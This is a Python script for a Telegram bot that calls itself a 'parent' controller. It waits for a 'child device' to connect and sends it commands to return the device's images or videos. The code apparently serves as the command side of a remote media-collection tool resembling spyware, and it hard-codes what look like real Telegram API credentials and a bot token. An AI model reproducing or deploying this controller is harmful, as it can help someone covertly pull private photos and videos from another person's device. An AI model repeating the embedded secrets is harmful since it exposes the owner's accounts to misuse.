import asyncio
from telethon import TelegramClient, events, Button

API_ID = 22071176
API_HASH = "7ed5401b625a0a4d3c45caf12c87f166"
BOT_TOKEN = "7402879073:AAFmS3FxnAMRDCdScW76TD9nwt19pXAIooQ"
AUTHORIZED_PARENT_IDS = {8032922682}

client = TelegramClient('parent_session', API_ID, API_HASH)

child_chat_id = None
media_message_id = None

@client.on(events.NewMessage(incoming=True))
async def handler(event):
    global child_chat_id, media_message_id
    if event.sender_id not in AUTHORIZED_PARENT_IDS:
        await event.respond("Unauthorized sender.")
        return

    text = (event.raw_text or "").strip().lower()
    if text == "/start":
        await event.respond("Parent bot online ✅\nWaiting for child device...")
    elif "device connected" in text:
        child_chat_id = event.sender_id
        msg = await event.respond(
            "Child device connected ✅\nSelect an action:",
            buttons=[[Button.inline("Receive Media", b"receive_media")]]
        )
        media_message_id = msg.id

@client.on(events.CallbackQuery)
async def callback(event):
    global child_chat_id, media_message_id
    if event.sender_id not in AUTHORIZED_PARENT_IDS:
        await event.answer("Unauthorized", alert=True)
        return

    if event.data == b"receive_media":
        await event.answer("Choose media type")
        await client.edit_message(
            event.chat_id,
            media_message_id,
            "Select media type to receive:",
            buttons=[
                [Button.inline("Get Images", b"get_images")],
                [Button.inline("Get Videos", b"get_videos")]
            ]
        )
    elif event.data in [b"get_images", b"get_videos"]:
        command = event.data.decode()
        await event.answer(f"Command sent to child: {command} ✅")
        if child_chat_id:
            await client.send_message(child_chat_id, f"!{command}")

# Start the bot
client.start(bot_token=BOT_TOKEN)
print("Parent bot running...")
client.run_until_disconnected()
